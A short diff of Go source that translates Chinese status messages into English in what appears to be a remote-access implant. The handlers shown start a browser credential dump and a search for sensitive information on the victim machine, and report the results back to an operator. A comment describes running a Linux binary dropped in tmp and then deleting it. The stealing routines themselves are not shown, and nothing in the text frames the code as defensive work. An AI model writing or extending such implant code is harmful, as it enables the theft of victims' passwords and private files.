@@ -556,9 +556,9 @@ func CmdDumpBrowser(b []byte) ([]byte, error) {
 	uid := strings.TrimSpace(string(b))
 	go func() {
 		commands.DumpBrowser(uid)
-		link.ReportData(0, []byte("[+] 浏览器密码抓取完成"))
+		link.ReportData(0, []byte("[+] Browser credential dump completed"))
 	}()
-	return []byte("[+] 浏览器密码抓取已启动..."), nil
+	return []byte("[+] Browser credential dump started..."), nil
 }
 
 // CmdSearchSensitive 敏感信息搜索
@@ -567,14 +567,14 @@ func CmdSearchSensitive(b []byte) ([]byte, error) {
 	go func() {
 		defer func() {
 			if r := recover(); r != nil {
-				errMsg := fmt.Sprintf("[!] 敏感信息搜索异常: %v\n", r)
+				errMsg := fmt.Sprintf("[!] Sensitive search error: %v\n", r)
 				link.ReportData(0, []byte(errMsg))
 			}
 		}()
 		commands.SearchSensitive(path)
-		link.ReportData(0, []byte("[+] 敏感信息搜索完成\n"))
+		link.ReportData(0, []byte("[+] Sensitive search finished\n"))
 	}()
-	return []byte("[+] 敏感信息搜索已启动...\n"), nil
+	return []byte("[+] Sensitive search started...\n"), nil
 }
 
 // ExecuteLinuxBin 执行Linux二进制（tmp落地执行后删除）
